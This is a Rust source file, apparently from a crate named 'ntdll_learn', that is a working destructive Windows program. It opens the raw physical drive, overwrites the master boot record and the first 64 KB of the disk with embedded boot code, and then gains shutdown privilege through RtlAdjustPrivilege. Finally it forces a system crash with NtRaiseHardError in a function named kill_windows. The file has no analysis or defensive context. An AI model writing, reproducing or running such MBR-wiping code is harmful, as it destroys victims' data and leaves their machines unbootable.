use ntdll_learn::{
    data::code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
    Library, NtRaiseHardErrorFn, RtlAdjustPrivilegeFn, LMEM_ZEROINIT,
};
use windows::{
    s,
    Win32::{
        Foundation::{
            GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS,
        },
        Storage::FileSystem::{
            CreateFileA, WriteFile, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, FILE_SHARE_WRITE,
            OPEN_EXISTING,
        },
    },
};

fn kill_windows() {
    let mut tmp1 = 0;
    let mut tmp2 = 0;
    let lib = Library::new("ntdll.dll");
    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
        lib.get_proc("RtlAdjustPrivilege");

    match rtl_adjust_privilege_proc {
        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
        None => panic!("Failed GetProc RtlAdjustPrivilege"),
    };

    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");

    match nt_raise_hard_error_proc {
        Some(nt_raise_hard_error) => {
            nt_raise_hard_error(NTSTATUS(0xc0000022 as u32 as i32), 0, 0, 0, 6, &mut tmp2)
        }
        None => panic!("Failed GetProc NtRaiseHardError"),
    };
}

fn main() {
    unsafe {
        let drive = match CreateFileA(
            s!("\\\\.\\PhysicalDrive0"),
            (GENERIC_READ | GENERIC_WRITE).0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES::default(),
            HANDLE::default(),
        ) {
            Ok(h) if h != INVALID_HANDLE_VALUE => Some(h),
            _ => panic!("Failed CreateFileA\nGetLastError: {:?}", GetLastError()),
        };

        let mut bootcode = vec![LMEM_ZEROINIT; 65536]; // alloc bootcode

        bootcode[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
        bootcode[0x1fe..0x1fe + CODE2_LEN].copy_from_slice(&CODE2[..CODE2_LEN]);

        let mut wb: u32 = Default::default();
        if !WriteFile(
            drive.unwrap(),
            Some(bootcode.as_slice()),
            Some(&mut wb),
            None,
        )
        .as_bool()
        {
            panic!("Failed Overwrite bootcode")
        }
    }
    kill_windows();
}
